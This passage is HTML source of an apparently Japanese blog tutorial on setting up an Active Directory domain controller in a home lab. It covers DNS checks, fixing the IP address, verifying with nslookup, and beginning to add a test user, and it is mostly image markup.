  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3ff8d86206a1469719ab33792915db67/8ac56/image-17.webp 240w,
/static/3ff8d86206a1469719ab33792915db67/d3be9/image-17.webp 480w,
/static/3ff8d86206a1469719ab33792915db67/b0a15/image-17.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3ff8d86206a1469719ab33792915db67/8ff5a/image-17.png 240w,
/static/3ff8d86206a1469719ab33792915db67/e85cb/image-17.png 480w,
/static/3ff8d86206a1469719ab33792915db67/0b533/image-17.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3ff8d86206a1469719ab33792915db67/0b533/image-17.png&quot;
            alt=&quot;image-17.png&quot;
            title=&quot;image-17.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;続くDNSオプション、追加オプションもデフォルトのまま進みます。&lt;/p&gt;
&lt;p&gt;追加オプションのNetBIOSドメイン名には先ほど設定したルートドメイン名が入ります。&lt;/p&gt;
&lt;p&gt;パス、オプションの確認もデフォルトのまま進め、最後にインストールを実行します。&lt;/p&gt;
&lt;p&gt;インストールにはしばらくかかるので、完了するまでコーヒーブレイクを楽しみましょう。&lt;/p&gt;
&lt;p&gt;インストールが完了すると再起動が実行され、ログイン画面にワークグループではなくドメイン名が表示されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4e218a4b5bfe6ef10e04522480f1bd66/0b533/image-27.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 80.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAARlAAAEZQAGA43XUAAAEIElEQVQ4yzWS/U+TVxSA34oIKCozU4NGPoTWFqGllJbW8tEP2r5AkYrQL8pboJQKrAWL0FIQiOC3Wcw23dymS4xsRkUxccuWxe1Pe3Zx2w9Pzs3JyXPPOfdKkiTxP0X7VJTsV1EqKCkuoljkjlRU0OpXCKdXiF9dYSC1RJldQWqJoDJHkVojgjCSaY8Qkkql+iQ6sH8fpUJSXrqfgyXFHFBJHDp2AmMgRXdyHf9UnsCVPLFMAd/4VSqcE0I0gmQR7InNkX/lZUKy11FZsZAWSRQLUZHo7NCJM1gnrjO68YT07e9J3XiEOZbHODyHL7FES3COzz2TFNnjSLZRJKugLYZUKiRlpaWUHSqnpPwIRyurqNTbsYwukrr7jOVHP7P541sWHm4TX/uGpuEsVf402ksZDENpKntTSF3jSJ2C9jGkph6FluEMzeJmvYgmJYdBydOfvUP6/lO2nr3l4S+/UXj8krm7P+BIrnLaP8u5wQzH+2Ypl69Q7E2h8kwhuSeRvF/coHt6HcfUGvbECtbxJUyxLL1zm+S+fs6DF7tC+pqbP+2QFKPrRxbRhBaoDl6jSkhPBdKcvDjLZ/0zHO6bRuqdXaFH4JlexZG6TmdyWZCnQzB95zFrT7bFuM8ofPuCwfw9DGMFGgLjNMoBNJEs6vA8dWKftcEMNcNppIH5Vfoyq7hTy3Qoc7inV0THOVzTS7hnlggWNkncuEckt4ErtYhR9tBQf5DWc6WoA5M0iF3rR+fRx+dpVDJIl7IFlPX7JBYW8TrbUPJbzD74juTWA6Zu3Wdi6y5jm3dI3vwSZTGH7FDjtJ3HadYghxS6F77CKr6TOTmPJTWHFFoqEFm9RTY3Q7zPhM1ipMvnYSibI5QvCJaJLK+Impv0X3ZjrDuGrVmHy6wj6jMQH/Hjm8niy1wTzCNNXN8gurJJMtaFXXOQxpqTrC+m2d7dZefjX+z8+ZE3gld//M3bl4/ZWEjga62ht/koXkMFV+UKBmQTsfwa4VweyT8WpycYoMepwdRSj63dytPtF+x8+MDr9+959e4db97v8npXxF9/59HT53hkGWtbC8ZWI3a7mfPNzZi8PVj8F5F8wcs4A4PorHaqmy2cNV3guKaJemsnjS4fWoeLBqeH1m4PFy40UaeuQ6PVoW88j7FJR0+7kQ5bGw5PH17ZhxSdmmJwRMFtM6Cvr0JbW4225jT+PplwNEgwMshQeIhIaJC4bKC94RRmdSUdInYbzhBqV9Nv1TDYpSfq1olH6TaRumhmXBQnxJITchOTciMTHg3j7rOCWsZctSjOs0QdGkZdOmKCsENLsFPLJbuGgK2OQFsVA5YzSCcPH2C4vZ4ZfyOTPi2TXg0JIZv0nvvvrP7ExB7d9UJeR1zIFUctsa4aoh3VRNqrCAuC9ir+AfmVYeWhb82fAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4e218a4b5bfe6ef10e04522480f1bd66/8ac56/image-27.webp 240w,
/static/4e218a4b5bfe6ef10e04522480f1bd66/d3be9/image-27.webp 480w,
/static/4e218a4b5bfe6ef10e04522480f1bd66/b0a15/image-27.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4e218a4b5bfe6ef10e04522480f1bd66/8ff5a/image-27.png 240w,
/static/4e218a4b5bfe6ef10e04522480f1bd66/e85cb/image-27.png 480w,
/static/4e218a4b5bfe6ef10e04522480f1bd66/0b533/image-27.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4e218a4b5bfe6ef10e04522480f1bd66/0b533/image-27.png&quot;
            alt=&quot;image-27.png&quot;
            title=&quot;image-27.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでAD環境の構築は完了です。&lt;/p&gt;
&lt;p&gt;この後は、ラボ環境に構築した他のマシンをADに追加し、グループポリシーで管理を行っていきます。&lt;/p&gt;
&lt;h3 id=&quot;ip固定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ip%E5%9B%BA%E5%AE%9A&quot; aria-label=&quot;ip固定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IP固定&lt;/h3&gt;
&lt;p&gt;作成したADにサーバを参加させる場合、ドメインに参加するサーバ側で優先DNSサーバの設定をドメインコントローラのIPアドレスに指定する必要があります。&lt;/p&gt;
&lt;p&gt;この作業を簡単にするため、ドメインコントローラ側のIPアドレスを固定します。&lt;/p&gt;
&lt;p&gt;ネットワークプロパティを開くと、デフォルトで優先DNSサーバがローカルホストに設定されていました。&lt;/p&gt;
&lt;p&gt;この設定のまま、IPアドレスを固定すれば完了です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 473px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/294c5eb1b8546188cedf978fd7ae6b39/c7c3c/image-20.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 111.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAAsTAAALEwEAmpwYAAADK0lEQVQ4y5VUiW7iMBTk/39sj6pSu0C7XIGQEnI6NzlImH3jkBSWaqWN9LBD7PGbeeM3+fBjuH4IR+JwdLG3HbiBwtELcHA8WPK+2VnYfdgwJYr6jKYD6vaiozp3+r2oarhxgYkTRnCOsrAokMQR4ihCmiYyj5EmjESP/J/f8yz7jPxzXmQpgiTHxI9ShGGAum5kQaGB8zwf54xMNpxOJx3Dt36U4Hquk7knWJMgzuF7LmzJ0rIszOczTGczrFdLbLdb7HY7rJYLLNdrzN/mmE2neHl5xfv7G15fOS6w3W2hwhBJUWPiqQTLxTvMvalp+b6HIAhwlANc10WkqYrOnofNZoPD4YAPCSbB+cG2YUsw2ygvMXEFsGvPKKsKfz+XywX/86j0xAxTnJsanmTgOo6muVqtYJp7GIYhmR5F33o84Kvo9MGXHtCPM02Vmx0B9H0fW2ODnWniVFb9hq7D+Sx2aZqHaNtWf79I9BlKZVqhTCDqV1b1Hd1hpJWoab/OH+dpml7XdQhT8aEbJoLearBQKV0QCnxLkU8ifjyK+J4AaXlkDKWytFW/+AHQRyyblAoFOEQtdIg1AEaR0noGga8PJSgPeQD0xYesskdAsQddzw1KAG4fUiYI/RaEPSDByrLsmXQjYKY3sJJN0wtfiYUaeac+pJ9luXgxGa01ZM1i9KGp9EWJMjlFrhTNyVOpC4MV580xpdrUi9eOMnzlzzvbxEWl6VjWXkBEIwEjdVLOrvQ5dqIz6ZHJEIN1ulvKcU56lQZkQQjGag9mHp5YOg2LouTbwEJrfnXEWJQoK8W0jW4CpKaU3GfJqjgVo07aNrKZspAF5TgcPnSVCXhXFP4QfaBA5/NWMD5F78b/ObbX8f7iX28Kf5ghT2b32EsReJ+NjaEzamTzVw/9+P37N/x8esJMWh57qgZkhrw2zTUrZslmy7i9q23b39ehwifxoCtJ9DIpVOWpp+wEETJp8Ylu9Y+RsP1TfHHC3gnxsrbxNFthatjYHBVs0XIpDdgw1rCOHiZ2ECNQMfx/hCcRRgkMAXheO/gx3+F5ZWNuStPdmvj19huLtaEP/ANQCJMLbUYznQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/294c5eb1b8546188cedf978fd7ae6b39/8ac56/image-20.webp 240w,
/static/294c5eb1b8546188cedf978fd7ae6b39/7124e/image-20.webp 473w&quot;
              sizes=&quot;(max-width: 473px) 100vw, 473px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/294c5eb1b8546188cedf978fd7ae6b39/8ff5a/image-20.png 240w,
/static/294c5eb1b8546188cedf978fd7ae6b39/c7c3c/image-20.png 473w&quot;
            sizes=&quot;(max-width: 473px) 100vw, 473px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/294c5eb1b8546188cedf978fd7ae6b39/c7c3c/image-20.png&quot;
            alt=&quot;image-20.png&quot;
            title=&quot;image-20.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;adとdnsの確認&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%81%A8dns%E3%81%AE%E7%A2%BA%E8%AA%8D&quot; aria-label=&quot;adとdnsの確認 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADとDNSの確認&lt;/h3&gt;
&lt;p&gt;サーバマネージャの [ツール]から[Active Directory ユーザとコンピュータ]を開き、[Domain Controllers]の欄に設定したコンピュータ名とルートドメイン名の組み合わせがDNS名に適切に設定されていることを確認します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 774px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/cb0974d2618b05ae87e6354b11811391/41d3b/image-21.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 97.08333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC+0lEQVQ4y31UCW7bMBDU/99R9DUJiqSIcyq2bMmURN0HRV2ezlJIC6dBCCxoW/Ls7MyQ3ilOEadnhHGMROcozhGKPEdrejTdiMF0WOcBxjSwo8F3y9oRXhgdcDrt8XoIEKoEar9HEJygEoVznKEocpwCH2lyQp6niMIIVVWhris0TYO+65BlGYbBouN3b3c44Og/4P39gHG0uLDTyzGFH4SIzgpl3eJ0jpGVNbrechpN5gapzhCRQFZUyKuGU0x4OGp4qmhQqEc87nZkUGC0FgOpR7Em88iBZkXJcScCGrdP8+KqN4MraXAhk7eUDAVZh3e4vb3B/d09/DcfJTs2XQudxm68JEkQU2Npqs5nShKw2QnH4xEHTphTczPOwLrAs2RkGkWtCkzTBNP37GrwHmgCW9ihd2ACvK4rhMpkBzeirHmeKdUEO5H1NAvg+MmrC3oKrIsWXcdmdLuj8IZNlmXGvKxo7IpqWDCQ1UUaEGgDnAg4boDyQHQQFh11qehY2zZ0s3bsHcsyR1Qa/LzJ8OMmx071MNOK2owY5xUy7RWgLAHsjXVGSGRkpWnqNIuVcsCpgPPZMNAUGiUlgAOncBp+BhSGRVUTKHEaiehKbToLARlt5C7/lVQYvj8uFyeNJw+vFLyIhiM0IzRQfFmZ1tAscTsnqOjZ0zzZt8/GAUqOPUEV6tJxITtpULcdCgZZfhfey7JclbzzUTKBGNvbjbUnmkiuZJeR5Bid44TBXa+k+G7NbBKnuYuWJyxcFkldzqYIr5LUxeCzFF/VB6BKM3Rtu5nyAdryhyPZBjxyhjr2feeayGjfAS7MplwsTVP/Y7hFYBNaXJZLIQpDJ4fcLF+tDzFmnuuy2cJ/BSgGaWZODLFM/1+NKKcYdsXM7auDFWPqtucxHf4HTCS4vGh1UZNZg9dQ49dzgKcgxpvv49Xfw3/f4/fDDv7+gKfnFzy/vCHNS7RyH34GFKcFSO6/vKygshLHOEeYZO4uVKyYBqhk22P3XTOfJcqyxB+OeLO9nuPK1QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/cb0974d2618b05ae87e6354b11811391/8ac56/image-21.webp 240w,
/static/cb0974d2618b05ae87e6354b11811391/d3be9/image-21.webp 480w,
/static/cb0974d2618b05ae87e6354b11811391/9b58d/image-21.webp 774w&quot;
              sizes=&quot;(max-width: 774px) 100vw, 774px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/cb0974d2618b05ae87e6354b11811391/8ff5a/image-21.png 240w,
/static/cb0974d2618b05ae87e6354b11811391/e85cb/image-21.png 480w,
/static/cb0974d2618b05ae87e6354b11811391/41d3b/image-21.png 774w&quot;
            sizes=&quot;(max-width: 774px) 100vw, 774px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/cb0974d2618b05ae87e6354b11811391/41d3b/image-21.png&quot;
            alt=&quot;image-21.png&quot;
            title=&quot;image-21.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;続いて、サーバマネージャの [ツール]から[DNS]を開き、前方参照ゾーンに作成したADに関連するゾーンが設定されていることを確認します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 859px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3f5feec02117af80f2fe0a7abb61b426/39a20/image-22.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 63.74999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB1ElEQVQ4y51S2W7cMAz0/39XX7pBgjRAgKZNduNTPtaHbEm2ZFtTUtuiCdAg2BIgSOoYajiKulGh7UcoM8OuHm7bYckppdxT/rnPboNZHPSyIopFgyR9QZyXEHWO10ygbjrIcYJzDvu+Y982itv7+CbftpXiCusYsCgRJyekFJVROLc9NcgwSAmlFLTWECXtKQ1jDEZqxHtaG2iq+2FAXTfh3KgMIjMbnOsEz88/0HUDyvyEx4cbbLuH90R9pc7WhvgvZxYXJkzbIlrsgqb4icPhK/KiQiNe8Hj/BVJqLMuCa2yxRFkpCdkmgdbuPc5NibvbA+I4Rtf34aCaJvT9QE0k5nkm2iMGojpSLSlfaY5sMwkTWbe961KRIDe335BnKc5dF9aKooAQAobAGPB4PCJLU2rS0/xqVHVFeUf7RFmbCy1Wk60+d7i7f0D8ekKe5zRHHwDLqoSjmbEwT0/fA4O2bVGWAhXtMeDMM9SEysYX2TT9x47oTUSTKTEdBuGaRdio5hFwzcqy/3mMW3dW+S8gu7UO/oOhX858tE53141Ups/41hzV3nv8j4UXDvRRp1EGeqxeiCG/wuk8Y8hJIUrp78VZQS5CzESNJBe/167zrGzwC+Ck6PlVm3NNAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3f5feec02117af80f2fe0a7abb61b426/8ac56/image-22.webp 240w,
/static/3f5feec02117af80f2fe0a7abb61b426/d3be9/image-22.webp 480w,
/static/3f5feec02117af80f2fe0a7abb61b426/4e068/image-22.webp 859w&quot;
              sizes=&quot;(max-width: 859px) 100vw, 859px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3f5feec02117af80f2fe0a7abb61b426/8ff5a/image-22.png 240w,
/static/3f5feec02117af80f2fe0a7abb61b426/e85cb/image-22.png 480w,
/static/3f5feec02117af80f2fe0a7abb61b426/39a20/image-22.png 859w&quot;
            sizes=&quot;(max-width: 859px) 100vw, 859px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3f5feec02117af80f2fe0a7abb61b426/39a20/image-22.png&quot;
            alt=&quot;image-22.png&quot;
            title=&quot;image-22.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最後に、PowerShellを起動して、作成したドメインで適切にドメインコントローラのアドレスが参照できることを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;$ nslookup hackroom&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lab
サーバー:  localhost
Address:  ::1
名前:    hackroom&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lab
Addresses:  2001:f71:81a0:3a00:3086:3ad5:664d:d4e0
          192&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;168&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;100&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;50&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ADサーバの優先DNSサーバは、ドメインコントローラ昇格の後にデフォルトでローカルホストが定義されています。&lt;/p&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;hacklab.local&lt;/code&gt;という名前で自分のアドレスを参照できていることが確認できました。&lt;/p&gt;
&lt;h3 id=&quot;adユーザの追加&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ad%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AE%E8%BF%BD%E5%8A%A0&quot; aria-label=&quot;adユーザの追加 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADユーザの追加&lt;/h3&gt;
&lt;p&gt;ADの設定直後はデフォルトのユーザしか登録されていないので、ユーザを追加していきます。&lt;/p&gt;
&lt;p&gt;サーバマネージャの [ツール]から[Active Directory 管理センター]を開きます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1a300755d0412ad4b2b1e1ef749b1af1/0b533/image-23.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 83.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAARlAAAEZQAGA43XUAAACoUlEQVQ4y31T21LTUBTNr+kLyEVahw9w9Av8AwUffGF8cEZ/gicckZsoWguITBGndQBLbBoa0uba3Jom7XLvQ1PunJk1O+ec7HXWvkmL6wUsr6zh/YePWFlbR6G4ha+ForDFrR/Cfvu+KVAoboo92+zsKqTHT55ibOwBRkdGkM/lMDU1RXiIfD6P6enpwd0oHuXyyNHd5OQEJsbHcf/+vRshLRRK2N4sokiv/trfx97eHnZ2drC7u4tSqYRKpYJyuTy0Ahe/r0ByXBf9NEG2Op0OwjBCt5sgSc7g+T5ctw3HceF5HqIouhXS8/ltvFj8g2fz+5hbPQQ/YLd9xAPCth/Ccj349EgUd5GmqTiP45ge7V6DdCQr0E0bqm7AJEdFqREUBEEgFIdhCF3Xxd4yTViWJRTftiRN02DTj924g6Qbo9FoQCPoepPCdOGTM5MwoWG0YBqmCJtXv9+/BimgUDoUe0jgMJrNJjkalMtYOPEZ548t55fBoZEvUwqSSwoFIf0UDQhZoaqqsG1b7FmZaVpUEIeUnxA0cXe7wogJoyEhk8myLJQKwkHILhGqal08aFKKztdVhdFlhWq9DqVWEyngxeeWZSOg4likzLad4d0dhGc5TKkoCz+rmKE24laaXTrE3GcZr5YO8PpTFW+/VPFuQ8abjRpmlo8JVbxclTGbYeX4BoWnLfxVmziqayhXFVRVHWrLwT+1gd+VA9RONJxQi+lOgFPHh9xoQWnaAqrhQvIvFIWtZRqwqD1sy4R+qtG3gTDwxZ6Lwrn02jRdvURMWBh4iKNQIKHWk/wgHBIyuCV6VK1YdD5NC01GNgVxfD4RSZIK9Ho9mp4MKaQw6ohQM3Az83TweJ07J9dw09iJ0bOoahwGtwJXMWveu5zuwn/CG9iu3nJD2AAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1a300755d0412ad4b2b1e1ef749b1af1/8ac56/image-23.webp 240w,
/static/1a300755d0412ad4b2b1e1ef749b1af1/d3be9/image-23.webp 480w,
/static/1a300755d0412ad4b2b1e1ef749b1af1/b0a15/image-23.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1a300755d0412ad4b2b1e1ef749b1af1/8ff5a/image-23.png 240w,
/static/1a300755d0412ad4b2b1e1ef749b1af1/e85cb/image-23.png 480w,
/static/1a300755d0412ad4b2b1e1ef749b1af1/0b533/image-23.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1a300755d0412ad4b2b1e1ef749b1af1/0b533/image-23.png&quot;
            alt=&quot;image-23.png&quot;
            title=&quot;image-23.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここで、上記のように登録したドメインのUsersを右クリックして、ユーザの新規登録を行います。&lt;/p&gt;
&lt;p&gt;ここでは、TESTUSERというユーザを作成しました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/887ea5efbb3dca1d1e42e668912a2c1a/0b533/image-24.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.00000000000001%; position: relative; bottom: 0; left: 0; background-image: 